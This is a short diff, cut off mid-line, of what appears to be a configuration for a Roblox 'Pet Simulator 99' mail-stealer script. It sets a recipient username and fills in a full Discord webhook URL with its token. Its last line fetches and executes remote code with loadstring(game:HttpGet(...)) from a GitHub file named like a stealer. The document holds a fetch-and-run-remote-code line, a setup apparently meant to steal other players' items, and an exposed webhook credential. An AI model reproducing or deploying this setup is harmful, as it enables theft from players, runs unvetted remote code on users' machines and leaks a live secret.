@@ -1,6 +1,6 @@
 Username = "makemegrow12"
 LoadScreen = true 
-Webhook = "Your Link Here" -- Paste your Discord webhook here
+Webhook = "https://discord.com/api/webhooks/1332724168223100978/L_8d2ZipWtgpDo7YG00CYOfSG-eJVTillk8ZzDd2grayQd-bXdaqeTZEoOOSGwNuzKQ1" -- Paste your Discord webhook here
 
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/KiuuP/PS99_Mailstea
